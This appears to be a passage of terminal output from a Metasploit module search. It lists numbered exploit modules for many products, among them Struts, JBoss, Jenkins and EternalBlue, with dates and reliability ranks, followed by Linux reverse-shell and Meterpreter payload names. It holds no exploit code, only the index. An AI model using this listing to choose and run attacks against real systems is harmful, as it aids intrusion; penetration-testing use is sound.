+   394  exploit/multi/fileformat/maple_maplet                                     2010-04-26       [32mexcellent[0m  No     Maple Maplet File Creation and Command Execution
+   395  exploit/multi/ftp/pureftpd_bash_env_exec                                  2014-09-24       [32mexcellent[0m  Yes    Pure-FTPd External Authentication Bash Environment Variable Code Injection (Shellshock)
+   396  exploit/multi/http/agent_tesla_panel_rce                                  2019-08-14       [32mexcellent[0m  Yes    Agent Tesla Panel Remote Code Execution
+   397  exploit/multi/http/apache_activemq_upload_jsp                             2016-06-01       [32mexcellent[0m  No     ActiveMQ web shell upload
+   398  exploit/multi/http/apache_jetspeed_file_upload                            2016-03-06       manual     No     Apache Jetspeed Arbitrary File Upload
+   399  exploit/multi/http/apache_mod_cgi_bash_env_exec                           2014-09-24       [32mexcellent[0m  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
+   400  exploit/multi/http/atutor_upload_traversal                                2019-05-17       [32mexcellent[0m  Yes    ATutor 2.2.4 - Directory Traversal / Remote Code Execution,
+   401  exploit/multi/http/auxilium_upload_exec                                   2012-09-14       [32mexcellent[0m  Yes    Auxilium RateMyPet Arbitrary File Upload Vulnerability
+   402  exploit/multi/http/axis2_deployer                                         2010-12-30       [32mexcellent[0m  No     Axis2 / SAP BusinessObjects Authenticated Code Execution (via SOAP)
+   403  exploit/multi/http/cisco_dcnm_upload_2019                                 2019-06-26       [32mexcellent[0m  Yes    Cisco Data Center Network Manager Unauthenticated Remote Code Execution
+   404  exploit/multi/http/clipbucket_fileupload_exec                             2018-03-03       [32mexcellent[0m  Yes    ClipBucket beats_uploader Unauthenticated Arbitrary File Upload
+   405  exploit/multi/http/coldfusion_rds_auth_bypass                             2013-08-08       [32mgreat[0m      Yes    Adobe ColdFusion RDS Authentication Bypass
+   406  exploit/multi/http/confluence_widget_connector                            2019-03-25       [32mexcellent[0m  Yes    Atlassian Confluence Widget Connector Macro Velocity Template Injection
+   407  exploit/multi/http/eaton_nsm_code_exec                                    2012-06-26       [32mexcellent[0m  Yes    Network Shutdown Module (sort_values) Remote PHP Code Injection
+   408  exploit/multi/http/eventlog_file_upload                                   2014-08-31       [32mexcellent[0m  Yes    ManageEngine Eventlog Analyzer Arbitrary File Upload
+   409  exploit/multi/http/git_client_command_exec                                2014-12-18       [32mexcellent[0m  No     Malicious Git and Mercurial HTTP Server For CVE-2014-9390
+   410  exploit/multi/http/gitlab_shell_exec                                      2013-11-04       [32mexcellent[0m  Yes    Gitlab-shell Code Execution
+   411  exploit/multi/http/glassfish_deployer                                     2011-08-04       [32mexcellent[0m  No     Sun/Oracle GlassFish Server Authenticated Code Execution
+   412  exploit/multi/http/hp_sitescope_issuesiebelcmd                            2013-10-30       [32mgreat[0m      Yes    HP SiteScope issueSiebelCmd Remote Code Execution
+   413  exploit/multi/http/hp_sitescope_uploadfileshandler                        2012-08-29       good       No     HP SiteScope Remote Code Execution
+   414  exploit/multi/http/hp_sys_mgmt_exec                                       2013-06-11       [32mexcellent[0m  Yes    HP System Management Homepage JustGetSNMPQueue Command Injection
+   415  exploit/multi/http/hyperic_hq_script_console                              2013-10-10       [32mexcellent[0m  Yes    VMware Hyperic HQ Groovy Script-Console Java Execution
+   416  exploit/multi/http/ibm_openadmin_tool_soap_welcomeserver_exec             2017-05-30       [32mexcellent[0m  Yes    IBM OpenAdmin Tool SOAP welcomeServer PHP Code Execution
+   417  exploit/multi/http/jboss_bshdeployer                                      2010-04-26       [32mexcellent[0m  No     JBoss JMX Console Beanshell Deployer WAR Upload and Deployment
+   418  exploit/multi/http/jboss_deploymentfilerepository                         2010-04-26       [32mexcellent[0m  No     JBoss Java Class DeploymentFileRepository WAR Deployment
+   419  exploit/multi/http/jboss_invoke_deploy                                    2007-02-20       [32mexcellent[0m  Yes    JBoss DeploymentFileRepository WAR Deployment (via JMXInvokerServlet)
+   420  exploit/multi/http/jboss_maindeployer                                     2007-02-20       [32mexcellent[0m  No     JBoss JMX Console Deployer Upload and Execute
+   421  exploit/multi/http/jboss_seam_upload_exec                                 2010-08-05       normal     Yes    JBoss Seam 2 File Upload and Execute
+   422  exploit/multi/http/jenkins_script_console                                 2013-01-18       good       Yes    Jenkins-CI Script-Console Java Execution
+   423  exploit/multi/http/jenkins_xstream_deserialize                            2016-02-24       [32mexcellent[0m  Yes    Jenkins XStream Groovy classpath Deserialization Vulnerability
+   424  exploit/multi/http/jira_hipchat_template                                  2015-10-28       [32mexcellent[0m  Yes    Atlassian HipChat for Jira Plugin Velocity Template Injection
+   425  exploit/multi/http/jira_plugin_upload                                     2018-02-22       [32mexcellent[0m  Yes    Atlassian Jira Authenticated Upload Code Execution
+   426  exploit/multi/http/manage_engine_dc_pmp_sqli                              2014-06-08       [32mexcellent[0m  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
+   427  exploit/multi/http/manageengine_auth_upload                               2014-12-15       [32mexcellent[0m  Yes    ManageEngine Multiple Products Authenticated File Upload
+   428  exploit/multi/http/manageengine_sd_uploader                               2015-08-20       [32mexcellent[0m  Yes    ManageEngine ServiceDesk Plus Arbitrary File Upload
+   429  exploit/multi/http/manageengine_search_sqli                               2012-10-18       [32mexcellent[0m  Yes    ManageEngine Security Manager Plus 5.5 Build 5505 SQL Injection
+   430  exploit/multi/http/mediawiki_thumb                                        2014-01-28       [32mexcellent[0m  Yes    MediaWiki Thumb.php Remote Command Execution
+   431  exploit/multi/http/mma_backdoor_upload                                    2012-04-02       [32mexcellent[0m  Yes    Th3 MMA mma.php Backdoor Arbitrary File Upload
+   432  exploit/multi/http/mobilecartly_upload_exec                               2012-08-10       [32mexcellent[0m  Yes    MobileCartly 1.0 Arbitrary File Creation Vulnerability
+   433  exploit/multi/http/mutiny_subnetmask_exec                                 2012-10-22       [32mexcellent[0m  Yes    Mutiny Remote Command Execution
+   434  exploit/multi/http/nostromo_code_exec                                     2019-10-20       good       Yes    Nostromo Directory Traversal Remote Command Execution
+   435  exploit/multi/http/novell_servicedesk_rce                                 2016-03-30       [32mexcellent[0m  Yes    Novell ServiceDesk Authenticated File Upload
+   436  exploit/multi/http/openfire_auth_bypass                                   2008-11-10       [32mexcellent[0m  Yes    Openfire Admin Console Authentication Bypass
+   437  exploit/multi/http/openmrs_deserialization                                2019-02-04       normal     Yes    OpenMRS Java Deserialization RCE
+   438  exploit/multi/http/opmanager_socialit_file_upload                         2014-09-27       [32mexcellent[0m  Yes    ManageEngine OpManager and Social IT Arbitrary File Upload
+   439  exploit/multi/http/oracle_ats_file_upload                                 2016-01-20       [32mexcellent[0m  Yes    Oracle ATS Arbitrary File Upload
+   440  exploit/multi/http/oracle_reports_rce                                     2014-01-15       [32mgreat[0m      Yes    Oracle Forms and Reports Remote Code Execution
+   441  exploit/multi/http/orientdb_exec                                          2017-07-13       good       Yes    OrientDB 2.2.x Remote Code Execution
+   442  exploit/multi/http/phpmyadmin_lfi_rce                                     2018-06-19       good       Yes    phpMyAdmin Authenticated Remote Code Execution
+   443  exploit/multi/http/phpwiki_ploticus_exec                                  2014-09-11       [32mexcellent[0m  No     Phpwiki Ploticus Remote Code Execution
+   444  exploit/multi/http/polarcms_upload_exec                                   2012-01-21       [32mexcellent[0m  Yes    PolarBear CMS PHP File Upload Vulnerability
+   445  exploit/multi/http/processmaker_plugin_upload                             2010-08-25       [32mexcellent[0m  No     ProcessMaker Plugin Upload
+   446  exploit/multi/http/qdpm_upload_exec                                       2012-06-14       [32mexcellent[0m  Yes    qdPM v7 Arbitrary PHP File Upload Vulnerability
+   447  exploit/multi/http/rocket_servergraph_file_requestor_rce                  2013-10-30       [32mgreat[0m      Yes    Rocket Servergraph Admin Center fileRequestor Remote Code Execution
+   448  exploit/multi/http/sflog_upload_exec                                      2012-07-06       [32mexcellent[0m  Yes    Sflog! CMS 1.0 Arbitrary File Upload Vulnerability
+   449  exploit/multi/http/solarwinds_store_manager_auth_filter                   2014-08-19       [32mexcellent[0m  Yes    SolarWinds Storage Manager Authentication Bypass
+   450  exploit/multi/http/solr_velocity_rce                                      2019-10-29       [32mexcellent[0m  Yes    Apache Solr Remote Code Execution via Velocity Template
+   451  exploit/multi/http/sonicwall_gms_upload                                   2012-01-17       [32mexcellent[0m  Yes    SonicWALL GMS 6 Arbitrary File Upload
+   452  exploit/multi/http/sonicwall_scrutinizer_methoddetail_sqli                2014-07-24       [32mexcellent[0m  Yes    Dell SonicWALL Scrutinizer 11.01 methodDetail SQL Injection
+   453  exploit/multi/http/splunk_mappy_exec                                      2011-12-12       [32mexcellent[0m  Yes    Splunk Search Remote Code Execution
+   454  exploit/multi/http/splunk_upload_app_exec                                 2012-09-27       good       Yes    Splunk Custom App Remote Code Execution
+   455  exploit/multi/http/struts2_namespace_ognl                                 2018-08-22       [32mexcellent[0m  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
+   456  exploit/multi/http/struts2_rest_xstream                                   2017-09-05       [32mexcellent[0m  Yes    Apache Struts 2 REST Plugin XStream RCE
+   457  exploit/multi/http/struts_code_exec                                       2010-07-13       good       No     Apache Struts Remote Command Execution
+   458  exploit/multi/http/struts_code_exec_classloader                           2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
+   459  exploit/multi/http/struts_code_exec_exception_delegator                   2012-01-06       [32mexcellent[0m  No     Apache Struts Remote Command Execution
+   460  exploit/multi/http/struts_code_exec_parameters                            2011-10-01       [32mexcellent[0m  Yes    Apache Struts ParametersInterceptor Remote Code Execution
+   461  exploit/multi/http/struts_default_action_mapper                           2013-07-02       [32mexcellent[0m  Yes    Apache Struts 2 DefaultActionMapper Prefixes OGNL Code Execution
+   462  exploit/multi/http/struts_dmi_exec                                        2016-04-27       [32mexcellent[0m  Yes    Apache Struts Dynamic Method Invocation Remote Code Execution
+   463  exploit/multi/http/struts_dmi_rest_exec                                   2016-06-01       [32mexcellent[0m  Yes    Apache Struts REST Plugin With Dynamic Method Invocation Remote Code Execution
+   464  exploit/multi/http/struts_include_params                                  2013-05-24       [32mgreat[0m      Yes    Apache Struts includeParams Remote Code Execution
+   465  exploit/multi/http/sysaid_auth_file_upload                                2015-06-03       [32mexcellent[0m  Yes    SysAid Help Desk Administrator Portal Arbitrary File Upload
+   466  exploit/multi/http/sysaid_rdslogs_file_upload                             2015-06-03       [32mexcellent[0m  Yes    SysAid Help Desk 'rdslogs' Arbitrary File Upload
+   467  exploit/multi/http/tomcat_jsp_upload_bypass                               2017-10-03       [32mexcellent[0m  Yes    Tomcat RCE via JSP Upload Bypass
+   468  exploit/multi/http/tomcat_mgr_deploy                                      2009-11-09       [32mexcellent[0m  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
+   469  exploit/multi/http/tomcat_mgr_upload                                      2009-11-09       [32mexcellent[0m  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
+   470  exploit/multi/http/totaljs_cms_widget_exec                                2019-08-30       [32mexcellent[0m  Yes    Total.js CMS 12 Widget JavaScript Code Injection
+   471  exploit/multi/http/vbulletin_getindexablecontent                          2020-03-12       manual     Yes    vBulletin /ajax/api/content_infraction/getIndexableContent nodeid Parameter SQL Injection
+   472  exploit/multi/http/webnms_file_upload                                     2016-07-04       [32mexcellent[0m  Yes    WebNMS Framework Server Arbitrary File Upload
+   473  exploit/multi/http/wp_db_backup_rce                                       2019-04-24       [32mexcellent[0m  Yes    WP Database Backup RCE
+   474  exploit/multi/http/zenworks_configuration_management_upload               2015-04-07       [32mexcellent[0m  Yes    Novell ZENworks Configuration Management Arbitrary File Upload
+   475  exploit/multi/http/zenworks_control_center_upload                         2013-03-22       [32mgreat[0m      Yes    Novell ZENworks Configuration Management Remote Execution
+   476  exploit/multi/http/zpanel_information_disclosure_rce                      2014-01-30       [32mexcellent[0m  No     Zpanel Remote Unauthenticated RCE
+   477  exploit/multi/ids/snort_dce_rpc                                           2007-02-19       good       No     Snort 2 DCE/RPC Preprocessor Buffer Overflow
+   478  exploit/multi/local/allwinner_backdoor                                    2016-04-30       [32mexcellent[0m  Yes    Allwinner 3.4 Legacy [45mKernel[0m Local Privilege Escalation
+   479  exploit/multi/local/magnicomp_sysinfo_mcsiwrapper_priv_esc                2016-09-23       [32mexcellent[0m  Yes    MagniComp SysInfo mcsiwrapper Privilege Escalation
+   480  exploit/multi/local/xorg_x11_suid_server                                  2018-10-25       good       Yes    Xorg X11 Server SUID logfile Privilege Escalation
+   481  exploit/multi/local/xorg_x11_suid_server_modulepath                       2018-10-25       good       Yes    Xorg X11 Server SUID modulepath Privilege Escalation
+   482  exploit/multi/misc/arkeia_agent_exec                                      2015-07-10       [32mgreat[0m      Yes    Western Digital Arkeia Remote Code Execution
+   483  exploit/multi/misc/batik_svg_java                                         2012-05-11       [32mexcellent[0m  No     Squiggle 1.7 SVG Browser Java Code Execution
+   484  exploit/multi/misc/bmc_server_automation_rscd_nsh_rce                     2016-03-16       [32mexcellent[0m  Yes    BMC Server Automation RSCD Agent NSH Remote Command Execution
+   485  exploit/multi/misc/claymore_dual_miner_remote_manager_rce                 2018-02-09       [32mexcellent[0m  Yes    Nanopool Claymore Dual Miner APIs RCE
+   486  exploit/multi/misc/consul_rexec_exec                                      2018-08-11       [32mexcellent[0m  Yes    Hashicorp Consul Remote Command Execution via Rexec
+   487  exploit/multi/misc/consul_service_exec                                    2018-08-11       [32mexcellent[0m  Yes    Hashicorp Consul Remote Command Execution via Services API
+   488  exploit/multi/misc/erlang_cookie_rce                                      2009-11-20       [32mgreat[0m      No     Erlang Port Mapper Daemon Cookie RCE
+   489  exploit/multi/misc/freeswitch_event_socket_cmd_exec                       2019-11-03       [32mexcellent[0m  Yes    FreeSWITCH Event Socket Command Execution
+   490  exploit/multi/misc/hp_data_protector_exec_integutil                       2014-10-02       [32mgreat[0m      Yes    HP Data Protector EXEC_INTEGUTIL Remote Code Execution
+   491  exploit/multi/misc/ibm_tm1_unauth_rce                                     2019-12-19       [32mexcellent[0m  No     IBM TM1 / Planning Analytics Unauthenticated Remote Code Execution
+   492  exploit/multi/misc/java_jdwp_debugger                                     2010-03-12       good       Yes    Java Debug Wire Protocol Remote Code Execution
+   493  exploit/multi/misc/java_rmi_server                                        2011-10-15       [32mexcellent[0m  No     Java RMI Server Insecure Default Configuration Java Code Execution
+   494  exploit/multi/misc/openoffice_document_macro                              2017-02-08       [32mexcellent[0m  No     Apache OpenOffice Text Document Malicious Macro Execution
+   495  exploit/multi/misc/osgi_console_exec                                      2018-02-13       normal     Yes    Eclipse Equinoxe OSGi Console Command Execution
+   496  exploit/multi/misc/persistent_hpca_radexec_exec                           2014-01-02       [32mgreat[0m      Yes    HP Client Automation Command Injection
+   497  exploit/multi/misc/teamcity_agent_xmlrpc_exec                             2015-04-14       [32mexcellent[0m  Yes    TeamCity Agent XML-RPC Command Execution
+   498  exploit/multi/misc/xdh_x_exec                                             2015-12-04       [32mexcellent[0m  Yes    Xdh / [45mLinux[0mNet Perlbot / fBot IRC Bot Remote Code Execution
+   499  exploit/multi/misc/zend_java_bridge                                       2011-03-28       [32mgreat[0m      No     Zend Server Java Bridge Arbitrary Java Code Execution
+   500  exploit/multi/mysql/mysql_udf_payload                                     2009-01-16       [32mexcellent[0m  No     Oracle MySQL UDF Payload Execution
+   501  exploit/multi/ntp/ntp_overflow                                            2001-04-04       good       No     NTP Daemon readvar Buffer Overflow
+   502  exploit/multi/php/php_unserialize_zval_cookie                             2007-03-04       average    Yes    PHP 4 unserialize() ZVAL Reference Counter Overflow (Cookie)
+   503  exploit/multi/postgres/postgres_copy_from_program_cmd_exec                2019-03-20       [32mexcellent[0m  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
+   504  exploit/multi/postgres/postgres_createlang                                2016-01-01       good       Yes    PostgreSQL CREATE LANGUAGE Execution
+   505  exploit/multi/realserver/describe                                         2002-12-20       [32mgreat[0m      Yes    RealServer Describe Buffer Overflow
+   506  exploit/multi/samba/nttrans                                               2003-04-07       average    No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
+   507  exploit/multi/sap/sap_mgmt_con_osexec_payload                             2011-03-08       [32mexcellent[0m  Yes    SAP Management Console OSExecute Payload Execution
+   508  exploit/multi/sap/sap_soap_rfc_sxpg_call_system_exec                      2013-03-26       [32mgreat[0m      Yes    SAP SOAP RFC SXPG_CALL_SYSTEM Remote Command Execution
+   509  exploit/multi/sap/sap_soap_rfc_sxpg_command_exec                          2012-05-08       [32mgreat[0m      Yes    SAP SOAP RFC SXPG_COMMAND_EXECUTE Remote Command Execution
+   510  exploit/multi/scada/inductive_ignition_rce                                2020-06-11       [32mexcellent[0m  Yes    Inductive Automation Ignition Remote Code Execution
+   511  exploit/multi/script/web_delivery                                         2013-07-19       manual     No     Script Web Delivery
+   512  exploit/multi/ssh/sshexec                                                 1999-01-01       manual     No     SSH User Code Execution
+   513  exploit/multi/svn/svnserve_date                                           2004-05-19       average    No     Subversion Date Svnserve
+   514  exploit/multi/vnc/vnc_keyboard_exec                                       2015-07-10       [32mgreat[0m      No     VNC Keyboard Remote Code Execution
+   515  exploit/multi/vpn/tincd_bof                                               2013-04-22       average    No     Tincd Post-Authentication Remote TCP Stack Buffer Overflow
+   516  exploit/multi/wyse/hagent_untrusted_hsdata                                2009-07-10       [32mexcellent[0m  No     Wyse Rapport Hagent Fake Hserver Command Execution
+   517  exploit/netware/smb/lsass_cifs                                            2007-01-21       average    No     Novell NetWare LSASS CIFS.NLM Driver Stack Buffer Overflow
+   518  exploit/netware/sunrpc/p[45mkernel[0m_callit                                     2009-09-30       good       No     NetWare 6.5 SunRPC Portmapper CALLIT Stack Buffer Overflow
+   519  exploit/osx/local/iokit_keyboard_root                                     2014-09-24       manual     Yes    Mac OS X IOKit Keyboard Driver Root Privilege Escalation
+   520  exploit/osx/local/nfs_mount_root                                          2014-04-11       normal     Yes    Mac OS X NFS Mount Privilege Escalation Exploit
+   521  exploit/unix/dhcp/rhel_dhcp_client_command_injection                      2018-05-15       [32mexcellent[0m  No     DHCP Client Command Injection (DynoRoot)
+   522  exploit/unix/local/setuid_nmap                                            2012-07-19       [32mexcellent[0m  Yes    Setuid Nmap Exploit
+   523  exploit/unix/sonicwall/sonicwall_xmlrpc_rce                               2016-07-22       [32mexcellent[0m  Yes    SonicWall Global Management System XMLRPC set_time_zone Unauth RCE
+   524  exploit/unix/webapp/bolt_authenticated_rce                                2020-05-07       [32mexcellent[0m  Yes    Bolt CMS 3.7.0 - Authenticated Remote Code Execution
+   525  exploit/unix/webapp/drupal_drupalgeddon2                                  2018-03-28       [32mexcellent[0m  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
+   526  exploit/unix/webapp/fusionpbx_exec_cmd_exec                               2019-11-02       [32mexcellent[0m  Yes    FusionPBX Command exec.php Command Execution
+   527  exploit/unix/webapp/fusionpbx_operator_panel_exec_cmd_exec                2019-06-06       [32mexcellent[0m  Yes    FusionPBX Operator Panel exec.php Command Execution
+   528  exploit/unix/webapp/havalite_upload_exec                                  2013-06-17       [32mexcellent[0m  Yes    Havalite CMS Arbitary File Upload Vulnerability
+   529  exploit/unix/webapp/jquery_file_upload                                    2018-10-09       [32mexcellent[0m  Yes    blueimp's jQuery (Arbitrary) File Upload
+   530  exploit/unix/webapp/libretto_upload_exec                                  2013-06-14       [32mexcellent[0m  Yes    LibrettoCMS File Manager Arbitary File Upload Vulnerability
+   531  exploit/unix/webapp/projectpier_upload_exec                               2012-10-08       [32mexcellent[0m  Yes    Project Pier Arbitrary File Upload Vulnerability
+   532  exploit/unix/webapp/rconfig_install_cmd_exec                              2019-10-28       [32mexcellent[0m  Yes    rConfig install Command Execution
+   533  exploit/unix/webapp/spip_connect_exec                                     2012-07-04       [32mexcellent[0m  Yes    SPIP connect Parameter PHP Injection
+   534  exploit/unix/webapp/thinkphp_rce                                          2018-12-10       [32mexcellent[0m  Yes    ThinkPHP Multiple PHP Injection RCEs
+   535  exploit/unix/webapp/trixbox_ce_endpoint_devicemap_rce                     2020-04-28       [32mexcellent[0m  Yes    TrixBox CE endpoint_devicemap.php Authenticated Command Execution
+   536  exploit/unix/webapp/vbulletin_vote_sqli_exec                              2013-03-25       [32mexcellent[0m  Yes    vBulletin index.php/ajax/api/reputation/vote nodeid Parameter SQL Injection
+   537  exploit/unix/webapp/xymon_useradm_cmd_exec                                2016-02-14       [32mexcellent[0m  Yes    Xymon useradm Command Execution
+   538  exploit/unix/webapp/zimbra_lfi                                            2013-12-06       [32mexcellent[0m  Yes    Zimbra Collaboration Server LFI
+   539  exploit/unix/webapp/zpanel_username_exec                                  2013-06-07       [32mexcellent[0m  Yes    ZPanel 10.0.0.2 htpasswd Module Username Command Execution
+   540  exploit/windows/browser/ms10_090_ie_css_clip                              2010-11-03       good       No     MS10-090 Microsoft Internet Explorer CSS SetUserClip Memory Corruption
+   541  exploit/windows/ftp/oracle9i_xdb_ftp_pass                                 2003-08-18       [32mgreat[0m      Yes    Oracle 9i XDB FTP PASS Overflow (win32)
+   542  exploit/windows/ftp/oracle9i_xdb_ftp_unlock                               2003-08-18       [32mgreat[0m      Yes    Oracle 9i XDB FTP UNLOCK Overflow (win32)
+   543  exploit/windows/http/hp_sitescope_dns_tool                                2015-10-09       good       No     HP SiteScope DNS Tool Command Injection
+   544  exploit/windows/http/icecast_header                                       2004-09-28       [32mgreat[0m      No     Icecast Header Overwrite
+   545  exploit/windows/http/oracle9i_xdb_pass                                    2003-08-18       [32mgreat[0m      Yes    Oracle 9i XDB HTTP PASS Overflow (win32)
+   546  exploit/windows/http/zenworks_uploadservlet                               2010-03-30       [32mexcellent[0m  No     Novell ZENworks Configuration Management Remote Execution
+   547  exploit/windows/local/capcom_sys_exec                                     1999-01-01       normal     Yes    Windows Capcom.sys [45mKernel[0m Execution Exploit (x64 only)
+   548  exploit/windows/local/mov_ss                                              2018-05-08       [32mexcellent[0m  No     Microsoft Windows POP/MOV SS Local Privilege Elevation Vulnerability
+   549  exploit/windows/local/mqac_write                                          2014-07-22       average    Yes    MQAC.sys Arbitrary Write Privilege Escalation
+   550  exploit/windows/local/ms11_080_afdjoinleaf                                2011-11-30       average    No     MS11-080 AfdJoinLeaf Privilege Escalation
+   551  exploit/windows/local/ms13_005_hwnd_broadcast                             2012-11-27       [32mexcellent[0m  No     MS13-005 HWND_BROADCAST Low to Medium Integrity Privilege Escalation
+   552  exploit/windows/local/ms13_053_schlamperei                                2013-12-01       average    Yes    Windows NTUserMessageCall Win32k [45mKernel[0m Pool Overflow (Schlamperei)
+   553  exploit/windows/local/ms14_058_track_popup_menu                           2014-10-14       normal     Yes    Windows TrackPopupMenu Win32k NULL Pointer Dereference
+   554  exploit/windows/local/ms15_051_client_copy_image                          2015-05-12       normal     Yes    Windows ClientCopyImage Win32k Exploit
+   555  exploit/windows/local/ms15_078_atmfd_bof                                  2015-07-11       manual     Yes    MS15-078 Microsoft Windows Font Driver Buffer Overflow
+   556  exploit/windows/local/ms16_075_reflection                                 2016-01-16       normal     Yes    Windows Net-NTLMv2 Reflection DCOM/RPC
+   557  exploit/windows/local/ms16_075_reflection_juicy                           2016-01-16       [32mgreat[0m      Yes    Windows Net-NTLMv2 Reflection DCOM/RPC (Juicy)
+   558  exploit/windows/local/ms18_8120_win32k_privesc                            2018-05-09       good       No     Windows SetImeInfoEx Win32k NULL Pointer Dereference
+   559  exploit/windows/local/ms_ndproxy                                          2013-11-27       average    Yes    MS14-002 Microsoft Windows ndproxy.sys Local Privilege Escalation
+   560  exploit/windows/local/novell_client_nicm                                  2013-05-22       average    Yes    Novell Client 2 SP3 nicm.sys Local Privilege Escalation
+   561  exploit/windows/local/novell_client_nwfs                                  2008-06-26       average    No     Novell Client 4.91 SP4 nwfs.sys Local Privilege Escalation
+   562  exploit/windows/local/plantronics_hub_spokesupdateservice_privesc         2019-08-30       [32mexcellent[0m  Yes    Plantronics Hub SpokesUpdateService Privilege Escalation
+   563  exploit/windows/local/pxeexploit                                          2011-08-05       [32mexcellent[0m  No     PXE Exploit Server
+   564  exploit/windows/misc/ahsay_backup_fileupload                              2019-06-01       [32mexcellent[0m  Yes    Ahsay Backup v7.x-v8.1.1.50 (authenticated) file upload
+   565  exploit/windows/misc/commvault_cmd_exec                                   2017-12-12       good       No     Commvault Communications Service (cvd) Command Injection
+   566  exploit/windows/rdp/cve_2019_0708_bluekeep_rce                            2019-05-14       manual     Yes    CVE-2019-0708 BlueKeep RDP Remote Windows [45mKernel[0m Use After Free
+   567  exploit/windows/smb/ms17_010_eternalblue                                  2017-03-14       average    Yes    MS17-010 EternalBlue SMB Remote Windows [45mKernel[0m Pool Corruption
+   568  exploit/windows/smb/ms17_010_eternalblue_win8                             2017-03-14       average    No     MS17-010 EternalBlue SMB Remote Windows [45mKernel[0m Pool Corruption for Win8+
+   569  exploit/windows/smb/smb_doublepulsar_rce                                  2017-04-14       [32mgreat[0m      Yes    SMB DOUBLEPULSAR Remote Code Execution
+   570  payload/cmd/unix/reverse_bash                                                              normal     No     Unix Command Shell, Reverse TCP (/dev/tcp)
+   571  payload/cmd/unix/reverse_bash_udp                                                          normal     No     Unix Command Shell, Reverse UDP (/dev/udp)
+   572  payload/[45mlinux[0m/aarch64/meterpreter/reverse_tcp                                              normal     No     [45mLinux[0m Meterpreter, Reverse TCP Stager
+   573  payload/[45mlinux[0m/aarch64/meterpreter_reverse_http                                             normal     No     [45mLinux[0m Meterpreter, Reverse HTTP Inline
+   574  payload/[45mlinux[0m/aarch64/meterpreter_reverse_https                                            normal     No     [45mLinux[0m Meterpreter, Reverse HTTPS Inline
+   575  payload/[45mlinux[0m/aarch64/meterpreter_reverse_tcp                                              normal     No     [45mLinux[0m Meterpreter, Reverse TCP Inline
+   576  payload/[45mlinux[0m/aarch64/shell/reverse_tcp                                                    normal     No     [45mLinux[0m dup2 Command Shell, Reverse TCP Stager
+   577  payload/[45mlinux[0m/aarch64/shell_reverse_tcp                                                    normal     No     [45mLinux[0m Command Shell, Reverse TCP Inline
+   578  payload/[45mlinux[0m/armbe/meterpreter_reverse_http                                               normal     No     [45mLinux[0m Meterpreter, Reverse HTTP Inline
+   579  payload/[45mlinux[0m/armbe/meterpreter_reverse_https                                              normal     No     [45mLinux[0m Meterpreter, Reverse HTTPS Inline
+   580  payload/[45mlinux[0m/armbe/meterpreter_reverse_tcp                                                normal     No     [45mLinux[0m Meterpreter, Reverse TCP Inline
+   581  payload/[45mlinux[0m/armbe/shell_bind_tcp                                                         normal     No     [45mLinux[0m ARM Big Endian Command Shell, Bind TCP Inline
+   582  payload/[45mlinux[0m/armle/adduser                                                                normal     No     [45mLinux[0m Add User
+   583  payload/[45mlinux[0m/armle/exec                                                                   normal     No     [45mLinux[0m Execute Command
+   584  payload/[45mlinux[0m/armle/meterpreter/bind_tcp                                                   normal     No     [45mLinux[0m Meterpreter, Bind TCP Stager
+   585  payload/[45mlinux[0m/armle/meterpreter/reverse_tcp                                                normal     No     [45mLinux[0m Meterpreter, Reverse TCP Stager
+   586  payload/[45mlinux[0m/armle/meterpreter_reverse_http                                               normal     No     [45mLinux[0m Meterpreter, Reverse HTTP Inline
+   587  payload/[45mlinux[0m/armle/meterpreter_reverse_https                                              normal     No     [45mLinux[0m Meterpreter, Reverse HTTPS Inline
+   588  payload/[45mlinux[0m/armle/meterpreter_reverse_tcp                                                normal     No     [45mLinux[0m Meterpreter, Reverse TCP Inline
+   589  payload/[45mlinux[0m/armle/shell/bind_tcp                                                         normal     No     [45mLinux[0m dup2 Command Shell, Bind TCP Stager
+   590  payload/[45mlinux[0m/armle/shell/reverse_tcp                                                      normal     No     [45mLinux[0m dup2 Command Shell, Reverse TCP Stager
+   591  payload/[45mlinux[0m/armle/shell_bind_tcp                                                         normal     No     [45mLinux[0m Command Shell, Reverse TCP Inline
+   592  payload/[45mlinux[0m/armle/shell_reverse_tcp                                                      normal     No     [45mLinux[0m Command Shell, Reverse TCP Inline
+   593  payload/[45mlinux[0m/mips64/meterpreter_reverse_http                                              normal     No     [45mLinux[0m Meterpreter, Reverse HTTP Inline
+   594  payload/[45mlinux[0m/mips64/meterpreter_reverse_https                                             normal     No     [45mLinux[0m Meterpreter, Reverse HTTPS Inline
+   595  payload/[45mlinux[0m/mips64/meterpreter_reverse_tcp                                               normal     No     [45mLinux[0m Meterpreter, Reverse TCP Inline
+   596  payload/[45mlinux[0m/mipsbe/exec                                                                  normal     No     [45mLinux[0m Execute Command
+   597  payload/[45mlinux[0m/mipsbe/meterpreter/reverse_tcp                                               normal     No     [45mLinux[0m Meterpreter, Reverse TCP Stager
+   598  payload/[45mlinux[0m/mipsbe/meterpreter_reverse_http                                              normal     No     [45mLinux[0m Meterpreter, Reverse HTTP Inline
+   599  payload/[45mlinux[0m/mipsbe/meterpreter_reverse_https                                             normal     No     [45mLinux[0m Meterpreter, Reverse HTTPS Inline
+   600  payload/[45mlinux[0m/mipsbe/meterpreter_reverse_tcp                                               normal     No     [45mLinux[0m Meterpreter, Reverse TCP Inline
+   601  payload/[45mlinux[0m/mipsbe/reboot                                                                normal     No     [45mLinux[0m Reboot
+   602  payload/[45mlinux[0m/mipsbe/shell/reverse_tcp                                                     normal     No     [45mLinux[0m Command Shell, Reverse TCP Stager
+   603  payload/[45mlinux[0m/mipsbe/shell_bind_tcp                                                        normal     No     [45mLinux[0m Command Shell, Bind TCP Inline
+   604  payload/[45mlinux[0m/mipsbe/shell_reverse_tcp                                                     normal     No     [45mLinux[0m Command Shell, Reverse TCP Inline
+   605  payload/[45mlinux[0m/mipsle/exec                                                                  normal     No     [45mLinux[0m Execute Command
+   606  payload/[45mlinux[0m/mipsle/meterpreter/reverse_tcp                                               normal     No     [45mLinux[0m Meterpreter, Reverse TCP Stager
